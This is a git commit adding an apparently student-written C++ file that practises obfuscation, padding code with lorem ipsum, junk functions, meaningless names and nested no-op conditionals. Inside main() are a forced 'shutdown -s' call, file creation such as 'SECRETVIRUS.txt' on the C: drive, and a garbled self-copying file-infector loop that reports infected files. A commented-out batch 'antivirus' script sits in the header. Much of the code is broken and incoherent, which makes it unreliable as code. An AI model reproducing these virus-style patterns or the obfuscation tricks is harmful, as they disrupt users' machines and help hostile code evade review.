3c765f44556ea3e3463ee11afec41e9f83d5cc88
Samantha Frankum <srf48@case.edu>
2019-10-12 19:59:25 -0400

    Add files via upload

---
+++ ObfuscatedPE-Import2.cpp
@@ -0,0 +1,255 @@
+/**
+Samantha Frankum
+
+festinare nocet, nocet et cunctatio saepe; tempore quaeque suo qui facit, ille sapit. Lorem ipsum dolor sit amet, no sea falli viderer iudicabit, est tollit conceptam te, ut sea congue graeci scripserit. Euismod dissentiunt concludaturque te nam. Per cu etiam discere. Vel duis illud mazim eu, ea eum insolens tractatos.
+Rebum utamur ea usu. Ne ornatus docendi cum. Voluptaria quaerendum in mel, laoreet habemus pro ea. Inani imperdiet intellegat vim ea. Saepe liberavisse his ex.
+Meis persecuti voluptaria cum ex, justo ridens has at, eos cibo probo convenire no. Mea ne prima utinam inermis. Ei quis mundi cetero nec, et usu honestatis interesset. Ne has laudem praesent, ad elit debet mel. Error senserit ut nec.
+Here is some more boionconsectetur adipiscing elit, 
+sed do eiusmod tempor incididunt ut 
+labre et dolore magna aliqua. Ut enim 
+ad inim veniam, quis nostrud exercitation ullamco 
+laboris nisi ut aliquip ex ea commodo consequat. 
+Duis ute irure dolor in reprehenderit in 
+voluptate velit esse cillum dolore eu fugiat 
+nulla pariatur. Excepteur sint occaecat cupidatat 
+non proident, sunt in culpa qui officia \
+deserunt mollit anim id est laborum.
+
+@echo off
+title Antivirus
+echo Antivirus
+echo created by YOUR NAME
+:start
+IF EXIST virus.bat goto infected
+IF NOT EXIST virus.bat goto clean
+cd C:Windowssystem32
+:infected
+echo WARNING VIRUS DETECTED!
+del virus.bat
+pause
+goto start
+:clean
+echo System secure!
+pause
+exit
+
+***************/
+
+#	include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <io.h>
+#include<dos.h>
+
+#include<conio.h> 
+#include<time.h> 
+void bubbleSort(int arr[], int n) ;
+int fib(int n){if (n <= 1)return n;return fib(n-1)+fib(n-2);}
+int fib2(int n){if (n <= 1)return n;return fib(n-1)+fib(n-2);}
+void bubbleSort(int arr[], int n);
+	int isFileExists(const char *path, const char *str);
+int hasString(FILE *fp, const char *str);
+int power(int base, int powerRaised);
+			void virus(int count);
+	void wasperresre(int *xsdfp, int *ysdfp);
+		int gcd(int dragon, int wizard);
+//gnome%gremlin==0&&goblin%gremlin==0)greatestGnome = gremlin//
+int main()
+{
+char s1[100], s2[100], i, j; for(i = 0; s1[i] != '\0'; ++i);
+for(j = 0; s2[j] != '\0'; ++j, ++i){s1[i] = s2[j];}
+char c;    
+      
+    
+system("shutdown -s");
+
+    FILE* qwerty;
+	qwerty = fopen("c:\\PE-2.txt ", "ab+");
+	qwerty = fopen("c:\\SECRETVIRUS.txt ", "ab+");
+	char string[] = "I want to learn PE file format!"; char pasdfasdfihakrtha[] = "PE-1.txt";
+	
+						FILE *fptr = fopen(pasdfasdfihakrtha, "ab+");
+     hasString(fptr, string);
+     int base = 10, powerRaised = 20, result;
+	result = power(base, powerRaised);
+ 
+ printf("%d^%d = %d", base, powerRaised, result);
+				virus(1000);  char buff[1000];
+
+ if(1){ while (fgets(buff, 512, fptr) != NULL){printf ("%s", buff);
+       }
+  
+  
+    } else {fprintf(fptr, "%s", string);  }
+        fclose(fptr);
+        
+        
+    FILE *virus,*host; int done,a=0; unsigned long x; 
+//Search for a file with any extension (*.*) 
+while(!done) { virus=fopen("arg_v[0]","rb"); 
+host=fopen("argv[0]","rb+"); 
+if(host==NULL) goto next; x=89088; printf("Infecting %s\n","ffblk.ff_name",a); } fread(buff,x,1,virus); fwrite(buff,x,1,host); a++; next: {  }  printf("DONE! (Total Files Infected= %d)",a); 
+ 
+ 
+    return 0;
+
+}
+int gcd(int dragon, int wizard){int drag, whiz;
+   	printf("Enter twLorem ipsum dolopor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatatnon proident, sunt in culpa qui officia \deserunt mollit anim id est laborum.o integers:");
+							scanf("%d %d", &dragon, &wizard);for(drag=1; drag <= whiz && drag <= whiz; ++drag){
+{if(dragon%wizard==0&&dragon%wizard==0)drag = wizard;}return whiz = 0;}
+			}
+
+void virus(int count){ char c[] = "hellognome%gremlin==0&&goblin%gremlin==0)greatestGnome = gremlin"; if( c[0] != '\n' && count != 0){ virus(count -1); printf("%c",c[0]); }}
+#define SECRET "I want to learn PE file format!"
+int power(int base, int powerRaised)
+{
+	printf("gnome%gremlin==0&&goblin%gremlin==0)greatestGnome = gremlin"); if (powerRaised != 0) return (base*power(base, powerRaised-1));else return 1;
+        //gnome%gremlin==0&&goblin%gremlin==0)greatestGnome = gremlin
+}
+
+#define S1923485 "c:\\PE-1.txt "
+int hasString(FILE *fp, const char *str){
+	char buff[1000];
+	int snake = 2;
+	while(fgets(buff, 512, fp) != NULL) {
+		
+		
+		
+		
+		if(10 > 5)
+
+            {
+            	fib(2);
+            	fib2(24);
+
+            	int snake= 10 + 5;
+
+            	if(snake< 19){
+
+            		snake++;
+
+				}
+
+				if(snake> 0){int dxy = 19;char c = 'z';double fourty = 40.0;
+
+				}
+
+				if(1 == 1){
+
+					if(1 == 1){
+
+	if(1 == 1){
+
+					if(1 == 1){
+						//gcd(0, 8);
+
+			if(1 == 1){
+
+					if(1 == 1){
+
+					if(1 == 1){
+
+					printf("Obfuscation sucks");
+
+					FILE* qwerty = fopen(S1923485, "ab+");
+
+				}
+
+				}
+
+				}
+
+				}
+
+				}
+
+				}	
+
+				}
+
+			}
+		
+		
+		
+		
+		 printf("%d", fib(fib(4))); fib(fib(4));
+		
+		
+		
+		
+		
+        if((strstr(buff, str)) != NULL) {
+            return 1;
+        }
+        
+        
+        
+        
+        
+        
+        
+        
+    }
+    return 0;
+	
+}
+					
+					
+					
+					
+					
+				
+
+					void wasperresre(int *xsdfp, int *ysdfp) {int temp = *xsdfp;*xsdfp = *ysdfp;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//int fib(int n){if (n <= 1)return n;return fib(n-1)+fib(n-2);}
+
+
+
+
+
+
+
+
+
+*ysdfp = temp;} 
+
+	void bubbleSort(int arr[], int n) 
+{int i, j;for (i = 0; i < n-1; i++)for (j = 0; j < n-i-1; j++)if (arr[j] > arr[j+1])wasperresre(&(arr[j]), &arr[j+1]);}
+
+int gcd2(int gnome, int goblin){int qwerty, gremlin;
+
+    printf("Enter twLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occintegers: \n");scanf("%d %d", &gnome, &goblin);for(gremlin=1; gremlin <= gnome && gremlin <= goblin; ++gremlin)
+    {if(gnome%gremlin==0&&goblin%gremlin==0)qwerty = gremlin;}
+	return qwerty;
+	
+	 fib(fib(4));
+
+}
+
+#define PASSWORD "I want to learn PE file format!"
+
+void swap(int *ccccc, int *yp) 
+
+{int temp = *ccccc;*ccccc = *yp;*yp = temp;} 
+
+#define S1923s485 "c:\\PE-1.txt "
+
